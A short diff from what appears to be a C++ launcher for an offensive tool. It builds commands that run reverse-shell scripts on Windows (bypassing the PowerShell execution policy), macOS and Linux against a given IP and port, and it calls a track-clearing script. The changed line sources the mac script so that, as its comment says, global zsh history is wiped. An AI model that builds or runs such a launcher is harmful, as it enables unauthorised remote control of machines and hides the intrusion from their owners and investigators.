@@ -13,7 +13,7 @@ int main() {
     std::string arguments = ip + port;
     
     std::string winScript = "powershell -ExecutionPolicy Bypass -File winRevShell.ps1" + arguments; // windows fuckery
-    std::string macScript = "./macRevShell.sh" + arguments;
+    std::string macScript = "source macRevShell.sh" + arguments; // mac fuckery, run as "source" to ensure global zsh history is cleared
     std::string linuxScript = "./linuxRevShell.sh" + arguments;
     std::string abortTracks = "./clearTracks.sh";
 
